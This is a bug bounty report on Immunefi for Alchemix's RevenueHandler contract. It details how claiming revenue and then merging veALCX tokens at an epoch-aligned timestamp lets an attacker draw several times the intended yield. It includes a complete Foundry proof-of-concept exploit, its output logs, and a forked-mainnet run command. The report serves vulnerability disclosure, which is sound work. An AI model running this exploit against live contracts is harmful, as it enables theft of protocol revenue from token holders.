# 30972 - \[SC - Critical] Theft of unclaimed yield of the revenue in the ...

## Theft of unclaimed yield of the revenue in the RevenueHandler contract by claimming and merge the tokens

Submitted on May 9th 2024 at 23:19:54 UTC by @perseverance for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30972

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol>

Impacts:

* Theft of unclaimed royalties
* Theft of unclaimed yield

### Description

## Description

### Brief/Intro

Theft of unclaimed yield of the revenue in the RevenueHandler contract by claimming and merge the tokens bug.

RevenueHandler contract is to distributes protocol revenue to veToken holders.

This contract can receive the ERC20 token and users with VeALCX tokens can receive the rewards by calling the function

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol#L186-L225>

```solidity
function claim(
        uint256 tokenId,
        address token,
        address alchemist,
        uint256 amount,
        address recipient
    ) external override {
        require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, tokenId), "Not approved or owner");

        uint256 amountBurned = 0;

        uint256 amountClaimable = _claimable(tokenId, token);
        
        // Redacted for simplicity

        if (amountBurned < amount) {
            IERC20(token).safeTransfer(recipient, amount - amountBurned); // @audit-issue Nếu alchemists[alchemist] == address(0) thì không cần phải burn và có thể chuyển tối đa amountClaimable cho recipient. Chỉ cần msg.sender là owner hoặc approved. 
        }

        emit ClaimRevenue(tokenId, token, amount, recipient);
    }

```

The claimable amount of a user is calculated based on the token balance at each epoch as in the internal function

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol#L297-L326>

```solidity

     function _claimable(uint256 tokenId, address token) internal view returns (uint256) {
        uint256 totalClaimable = 0;
        uint256 lastClaimEpochTimestamp = userCheckpoints[tokenId][token].lastClaimEpoch;
        if (lastClaimEpochTimestamp == 0) {
            /*
                If we get here, the user has not yet claimed anything from the RevenueHandler.
                We need to get the first epoch that they deposited so we know where to start tallying from.
            */
            // Get index of first epoch
            uint256 lastUserEpoch = IVotingEscrow(veALCX).userFirstEpoch(tokenId);
            // Get timestamp from index
            lastClaimEpochTimestamp = (IVotingEscrow(veALCX).pointHistoryTimestamp(lastUserEpoch) / WEEK) * WEEK - WEEK;
        }
        /*
            Start tallying from the "next" epoch after the last epoch that they claimed, since they already
            claimed their revenue from "lastClaimEpochTimestamp".
        */
        for (
            uint256 epochTimestamp = lastClaimEpochTimestamp + WEEK;
            epochTimestamp <= currentEpoch;
            epochTimestamp += WEEK
        ) {
            uint256 epochTotalVeSupply = IVotingEscrow(veALCX).totalSupplyAtT(epochTimestamp);
            if (epochTotalVeSupply == 0) continue;
            uint256 epochRevenue = epochRevenues[epochTimestamp][token];
            uint256 epochUserVeBalance = IVotingEscrow(veALCX).balanceOfTokenAt(tokenId, epochTimestamp);
            totalClaimable += (epochRevenue * epochUserVeBalance) / epochTotalVeSupply;
        }
        return totalClaimable + userCheckpoints[tokenId][token].unclaimed;
    }
```

Each time when the function [checkpoint()](https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol#L228) is called then **currentEpoch** is updated with the current epoch.

So after this RevenueHandler receive some token then the VeAlcx token holders will receive the reward and can claim these rewards by calling claim function in the RevenueHandler() contract.

### The vulnerability

#### Vulnerability Details

For easier to understand, I will explain the bug with some POC code and some data to easier to follow.

Now the attacker can theft of the token in this contract to get several times bigger than intended by Alchemix DAO system. Suppose that the Revenue Handler contract receive 1000 \* e18 DAI token. Suppose that a user is to be receive 200 \* e18 DAI token because he has locked 10 \* e18 BPT into the Voting Escrow contract. (suppose: The total amount of lock BPT is 100 \* e18 BPT).

Now the attacker can manipulate the system top get several times bigger then the intended amount of DAI token. I can demonstrate in the POC section that the attacker can get 650 \* e18 DAI token that is 3.25 times bigger than the intended amount.

How to do that?

Step 1: To prepare for the attack, the attacker will mint many tokenIds. Suppose the attacker has 10 \*e18 BPT as the capital. He will mint 10 tokenIds with each token lock e18 BPT.

```solidity
 for (uint256 i = 0; i < count; i++) {
           tokenIds[i] =  createVeAlcx(attacker, TOKEN_1, 4 weeks, false);
} 
```

Step 2: Wait for the contract RevenueHandler to receive some token. For example in this POC, it is 1000\* 10^18 DAI

Step3: The attacker will choose to launch the attack in the block that have block.timestamp = nearest timestamp that have modulo 2 weeks is zero.

```solidity
    uint256 internal constant WEEK = 2 weeks;
    console2.log("Choose the block.timestamp to be exact time that have modulo WEEK equal to 0"); 
    hevm.warp((block.timestamp / WEEK) * WEEK + WEEK ) ; // The block.timestamp % WEEK = 0 
```

This block.timestamp is important. It is possible to do so, because the Ethereum block now is exact 12 seconds a block. See references: <https://ethereum.org/en/developers/docs/blocks/>

So attacker can choose to launch the attack.

Step 4: The attacker will continuously call the sequence in an attack contract

```solidity
    for (uint256 i = 0; i < count-1; ++i) {
            
            revenueHandler.checkpoint();
            console2.log("i: %s", i);
            tokenId1 = tokenIds[i]; 
            tokenId2 = tokenIds[i+1]; 
            claimable = revenueHandler.claimable(tokenId1, dai);
            console2.log("claimable: %s", claimable);
            revenueHandler.claim(tokenId1, dai, address(0x00), claimable, address(this));
            veALCX.merge(tokenId1, tokenId2);

        }
        
        revenueHandler.checkpoint();
        claimable = revenueHandler.claimable(tokenIds[count-1], dai);            
        console2.log("claimable: %s", claimable);
        revenueHandler.claim(tokenIds[count-1], dai, address(0x00), claimable, address(this));
```

The attack is done. Check the DAI balance of the attacker.

````
```solidity
console2.log("Balance of the attacker: %s",IERC20(dai).balanceOf(attacker));
```
````

**Why this is possible?**

Because in the function \_claimable() above the totalClaimable is calculated

```solidity
    for (
            uint256 epochTimestamp = lastClaimEpochTimestamp + WEEK;
            epochTimestamp <= currentEpoch;
            epochTimestamp += WEEK
        ) {
            uint256 epochTotalVeSupply = IVotingEscrow(veALCX).totalSupplyAtT(epochTimestamp);
            if (epochTotalVeSupply == 0) continue;
            uint256 epochRevenue = epochRevenues[epochTimestamp][token];
            uint256 epochUserVeBalance = IVotingEscrow(veALCX).balanceOfTokenAt(tokenId, epochTimestamp);
            totalClaimable += (epochRevenue * epochUserVeBalance) / epochTotalVeSupply;
        }
```

So the loop is from lastClaimEpochTimestamp + WEEK to currentEpoch and totalClaimable is a sum of the epochRevenue \* epochUserVeBalance / epochTotalVeSupply.

So the epochTimestamp is calculated based and the loop would go up until currentEpoch. This storage variable is updated in checkpoint() function.

Also for this attack, the tokenConfig.poolAdapter is zero and the ERC20 token reward stays in the contract.

When the ERC20 stays in the contract, then everytime checkpoint() is called then the epochRevenues got updated.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol#L228-L231>

```solidity
            uint256 thisBalance = IERC20(token).balanceOf(address(this));

                // If poolAdapter is set, the revenue token is an alchemic-token
                if (tokenConfig.poolAdapter != address(0)) {
                    // Redacted
                } else {
                    // If the revenue token doesn't have a poolAdapter, it is not an alchemic-token
                    amountReceived = thisBalance;

                    // Update amount of non-alchemic-token revenue received for this epoch
                    epochRevenues[currentEpoch][token] += amountReceived;
                }

```

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol#L228-L231>

```solidity
function checkpoint() public {
        // only run checkpoint() once per epoch
        if (block.timestamp >= currentEpoch + WEEK /* && initializer == address(0) */) {
            currentEpoch = (block.timestamp / WEEK) * WEEK;
    // Redacted    
    }
```

So the currentEpoch is always round down to the timestamp that is modulo of 2 weeks that is 0 .

```solidity
currentEpoch % WEEK = 0 

```

That is the reason that the attacker need to launch the attack at the exact timestamp to be able to exploit this and gain benefit.

So when at this block.timestamp, the attacker can claim the reward amount of the tokenId1. Suppose that the tokenID1 has balance of 10\*\*18

Claimable amount = 10\*\*18 \* K = 19999999999851780798

Then the attacker call merge token to merge tokenId1 with tokenId2

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol#L618C5-L651C6>

```solidity
function merge(uint256 _from, uint256 _to) external {
        
        // redacted for simplicity

        uint256 value0 = uint256(_locked0.amount);

        // redacted for simplicity
        // redacted for simplicity
        _burn(_from, value0);
        _depositFor(_to, value0, end, _locked1.maxLockEnabled, _locked1, DepositType.MERGE_TYPE);
    }

```

You notice that the balance of tokenId2 is also added with balance of tokenId1 in the \_depositFor

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol#L1331>

```solidity
    _locked.amount += _value;
```

So now balance of tokenId2 is 2\* 10 \*\* 18

And the claimable amount of tokenId2 is

claimable = BalanceTokenId2 \* K = 2\* 10 \*\* 18 \* K => total claimable = 29999999999932197599

After the first loop, you can see that the claimable in increased abnormally.

This loop can continue and the claimable amount for the attacker is increased.

```
[PASS] testClaimRevenueMerge_Hacked() (gas: 11599416)
Logs:
  Choose the block.timestamp to be exact time that have modulo WEEK equal to 0
  Current block.timestamp: 1716422400
  Balance of the revenueHandler: 1000000000000000000000
  i: 0
  claimable: 19999999999851780798
  i: 1
  claimable: 29999999999932197599
  i: 2
  claimable: 39999999999856511198
  i: 3
  claimable: 49999999999932197599
  i: 4
  claimable: 59999999999854934398
  i: 5
  claimable: 69999999999925890399
  i: 6
  claimable: 79999999999847050398
  i: 7
  claimable: 89999999999913275998
  i: 8
  claimable: 99999999999832859198
  claimable: 109999999999894354398
  Balance of the attacker: 649999999998841051983

```

At the end the total amount that the attacker gained is 649999999998841051983 that is 3.25 times bigger than 19999999999851780798.

This is because after each merge, the balance of the first token is added up to the balance of the second token. So the attacker gain 2 claimable amount for the first token. So by adding more loops, the gain increased but also the gas spent. So attacker will need to calculate to find the optimal value. But for demonstrating purpose, it is enough to show the bug.

## Impacts

## About the severity assessment

The impact is that the attacker will be able to exploit the system to get several times bigger the Claim amount of Revenue Handler contract. For example, in the POC, the attacker can get 3.25 times bigger with the same capital.

The severity: High

Category:

* Theft of unclaimed yield or Theft of unclaimed royalties

Capital for the attack: Gas to execute the transactions. Some amount of BPT to invest to lock to get the VeAlcx tokens. BPT can be big, the the bigger amount of the rewards. Can theft most of the reward token in the contract.

Easy to exploit and easy to be automated.

### Proof of concept

## Proof of concept

I created the POC code as follow:

```solidity
function testClaimRevenueMerge_Hacked() external {
        address owner = revenueHandler.owner();
        // Setup the scenario when PoolAdapter is zero 
        hevm.prank(owner);
        revenueHandler.setPoolAdapter(dai, address(0x00));
        hevm.stopPrank();
        // Start of the test case
        uint256 revAmt = 1000e18; // Revenue is 1000 DAI 
        address attacker = address(this);
        address Alice = address(0x11223344); 
        address Bob = address(0x55667788);
        uint256 count = 10; 
        uint256[] memory tokenIds = new uint256[](count); 
        uint256 tokenId1; 
        uint256 tokenId2; 
        uint256 claimable; 

        for (uint256 i = 0; i < count; i++) {
           tokenIds[i] =  createVeAlcx(attacker, TOKEN_1, 4 weeks, false);
        }
               
        uint256 tokenId7 = createVeAlcx(Alice, 90*TOKEN_1, 4 weeks, false);        

        _accrueRevenueAndJump1Epoch(revAmt);       

        console2.log("Choose the block.timestamp to be exact time that have modulo WEEK equal to 0"); 
        hevm.warp((block.timestamp / WEEK) * WEEK + WEEK );
        console2.log("Current block.timestamp: %s", block.timestamp);
        console2.log("Balance of the revenueHandler: %s",IERC20(dai).balanceOf(address(revenueHandler)));
        
        for (uint256 i = 0; i < count-1; ++i) {
            
            revenueHandler.checkpoint();
            console2.log("i: %s", i);
            tokenId1 = tokenIds[i]; 
            tokenId2 = tokenIds[i+1]; 
            claimable = revenueHandler.claimable(tokenId1, dai);
            console2.log("claimable: %s", claimable);
            revenueHandler.claim(tokenId1, dai, address(0x00), claimable, address(this));
            veALCX.merge(tokenId1, tokenId2);

        }
        
        revenueHandler.checkpoint();
        claimable = revenueHandler.claimable(tokenIds[count-1], dai);            
        console2.log("claimable: %s", claimable);
        revenueHandler.claim(tokenIds[count-1], dai, address(0x00), claimable, address(this));
        console2.log("Balance of the attacker: %s",IERC20(dai).balanceOf(attacker));
    }
```

I already explained the attack above.

The log shows:

```
[PASS] testClaimRevenueMerge_Hacked() (gas: 11599416)
Logs:
  Choose the block.timestamp to be exact time that have modulo WEEK equal to 0
  Current block.timestamp: 1716422400
  Balance of the revenueHandler: 1000000000000000000000
  i: 0
  claimable: 19999999999851780798
  i: 1
  claimable: 29999999999932197599
  i: 2
  claimable: 39999999999856511198
  i: 3
  claimable: 49999999999932197599
  i: 4
  claimable: 59999999999854934398
  i: 5
  claimable: 69999999999925890399
  i: 6
  claimable: 79999999999847050398
  i: 7
  claimable: 89999999999913275998
  i: 8
  claimable: 99999999999832859198
  claimable: 109999999999894354398
  Balance of the attacker: 649999999998841051983

```

At the end Balance of the attacker: 649999999998841051983 DAI

I also created a test case to show in a normal case, what the user get

```solidity
function testClaimRevenueMerge_Normal() external {
        // Setup the scenario when PoolAdapter is zero 
        address owner = revenueHandler.owner();
        hevm.prank(owner);
        revenueHandler.setPoolAdapter(dai, address(0x00));
        hevm.stopPrank();
        // Start of the test case
        uint256 revAmt = 1000e18; // Revenue is 1000 DAI 
        address attacker = address(this);        
        address Alice = address(0x11223344); 
        address Bob = address(0x55667788);
        uint256 tokenId1 = createVeAlcx(attacker, 10*TOKEN_1, 4 weeks, false);        
        uint256 tokenId3 = createVeAlcx(Alice, 90*TOKEN_1, 4 weeks, false);        
      
        _accrueRevenueAndJump1Epoch(revAmt);

        console2.log("Balance of the revenueHandler: %s",IERC20(dai).balanceOf(address(revenueHandler)));
        console2.log("Choose the block.timestamp to be exact time that have modulo WEEK equal to 0"); 
        hevm.warp((block.timestamp / WEEK) * WEEK + WEEK );
        console2.log("Current block.timestamp: %s", block.timestamp);
        revenueHandler.checkpoint();

        uint256 claimable = revenueHandler.claimable(tokenId1, dai);        
        
        console2.log("claimable: %s", claimable);        
        console2.log("Balance of the attacker: %s",IERC20(dai).balanceOf(attacker));
        console2.log("Current block.timestamp: %s", block.timestamp);
        revenueHandler.claim(tokenId1, dai, address(0x00), claimable, address(this));        
        console2.log("Balance of the attacker: %s",IERC20(dai).balanceOf(attacker));
    }

```

The log shows:

```solidity
[PASS] testClaimRevenueMerge_Normal() (gas: 2256883)
Logs:
  Balance of the revenueHandler: 1000000000000000000000
  Choose the block.timestamp to be exact time that have modulo WEEK equal to 0
  Current block.timestamp: 1716422400
  claimable: 199999999999936927998
  Balance of the attacker: 0
  Current block.timestamp: 1716422400
  Balance of the attacker: 199999999999936927998
```

So the Full POC code:

```
    function _accrueRevenueAndJump1Epoch(uint256 revAmt) internal {
        revenueHandler.checkpoint();
        _jumpOneEpoch();
        _accrueRevenue(dai, revAmt);
        revenueHandler.checkpoint();
        
    }
    function testClaimRevenueMerge_Hacked() external {
        address owner = revenueHandler.owner();
        // Setup the scenario when PoolAdapter is zero 
        hevm.prank(owner);
        revenueHandler.setPoolAdapter(dai, address(0x00));
        hevm.stopPrank();
        // Start of the test case
        uint256 revAmt = 1000e18; // Revenue is 1000 DAI 
        address attacker = address(this);
        address Alice = address(0x11223344); 
        address Bob = address(0x55667788);
        uint256 count = 10; 
        uint256[] memory tokenIds = new uint256[](count); 
        uint256 tokenId1; 
        uint256 tokenId2; 
        uint256 claimable; 

        for (uint256 i = 0; i < count; i++) {
           tokenIds[i] =  createVeAlcx(attacker, TOKEN_1, 4 weeks, false);
        }
               
        uint256 tokenId7 = createVeAlcx(Alice, 90*TOKEN_1, 4 weeks, false);        

        _accrueRevenueAndJump1Epoch(revAmt);       

        console2.log("Choose the block.timestamp to be exact time that have modulo WEEK equal to 0"); 
        hevm.warp((block.timestamp / WEEK) * WEEK + WEEK );
        console2.log("Current block.timestamp: %s", block.timestamp);
        console2.log("Balance of the revenueHandler: %s",IERC20(dai).balanceOf(address(revenueHandler)));
        
        for (uint256 i = 0; i < count-1; ++i) {
            
            revenueHandler.checkpoint();
            console2.log("i: %s", i);
            tokenId1 = tokenIds[i]; 
            tokenId2 = tokenIds[i+1]; 
            claimable = revenueHandler.claimable(tokenId1, dai);
            console2.log("claimable: %s", claimable);
            revenueHandler.claim(tokenId1, dai, address(0x00), claimable, address(this));
            veALCX.merge(tokenId1, tokenId2);

        }
        
        revenueHandler.checkpoint();
        claimable = revenueHandler.claimable(tokenIds[count-1], dai);            
        console2.log("claimable: %s", claimable);
        revenueHandler.claim(tokenIds[count-1], dai, address(0x00), claimable, address(this));
        console2.log("Balance of the attacker: %s",IERC20(dai).balanceOf(attacker));
    }

    function testClaimRevenueMerge_Normal() external {
        // Setup the scenario when PoolAdapter is zero 
        address owner = revenueHandler.owner();
        hevm.prank(owner);
        revenueHandler.setPoolAdapter(dai, address(0x00));
        hevm.stopPrank();
        // Start of the test case
        uint256 revAmt = 1000e18; // Revenue is 1000 DAI 
        address attacker = address(this);        
        address Alice = address(0x11223344); 
        address Bob = address(0x55667788);
        uint256 tokenId1 = createVeAlcx(attacker, 10*TOKEN_1, 4 weeks, false);        
        uint256 tokenId3 = createVeAlcx(Alice, 90*TOKEN_1, 4 weeks, false);        
      
        _accrueRevenueAndJump1Epoch(revAmt);

        console2.log("Balance of the revenueHandler: %s",IERC20(dai).balanceOf(address(revenueHandler)));
        console2.log("Choose the block.timestamp to be exact time that have modulo WEEK equal to 0"); 
        hevm.warp((block.timestamp / WEEK) * WEEK + WEEK );
        console2.log("Current block.timestamp: %s", block.timestamp);
        revenueHandler.checkpoint();

        uint256 claimable = revenueHandler.claimable(tokenId1, dai);        
        
        console2.log("claimable: %s", claimable);        
        console2.log("Balance of the attacker: %s",IERC20(dai).balanceOf(attacker));
        console2.log("Current block.timestamp: %s", block.timestamp);
        revenueHandler.claim(tokenId1, dai, address(0x00), claimable, address(this));        
        console2.log("Balance of the attacker: %s",IERC20(dai).balanceOf(attacker));
    }
```

To run the test code, Copy the test cases above into the file: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/test/RevenueHandler.t.sol>

Run command

```

FOUNDRY_PROFILE=default forge test --fork-url https://rpc.ankr.com/eth --match-path src/test/RevenueHandler.t.sol --match-test testClaimRevenueMerge  --fork-block-number 19822400 -vvvvv  > testClaimRevenueMerge.log
```

The full log with debug information:

<https://drive.google.com/file/d/1FpWmwrAZGfwaDnrg67H-5Vq\\_xaokadaW/view?usp=sharing>
